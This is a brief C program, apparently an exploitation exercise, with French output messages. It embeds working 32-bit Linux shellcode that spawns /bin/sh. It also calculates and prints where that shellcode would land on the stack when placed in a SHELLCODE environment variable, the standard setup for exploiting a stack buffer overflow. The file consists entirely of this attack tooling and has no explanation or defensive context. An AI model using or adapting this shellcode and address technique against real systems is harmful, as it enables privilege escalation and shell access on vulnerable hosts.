#include <stdio.h>
#include <string.h>
#include <stdlib.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
char *env[] = {shellcode, NULL};

unsigned long calculate_shellcode_addr(char *program_path) {
    return 0xc0000000 - 4 - strlen(program_path) - 1 - strlen(shellcode) - 1;
}

int main(int argc, char **argv) {
    char *shellcode_env = getenv("SHELLCODE");
    printf("Adresse calculée: 0x%x\n", calculate_shellcode_addr(argv[0]));
    printf("Adresse réelle: %p\n", shellcode_env);
    return 0;
}
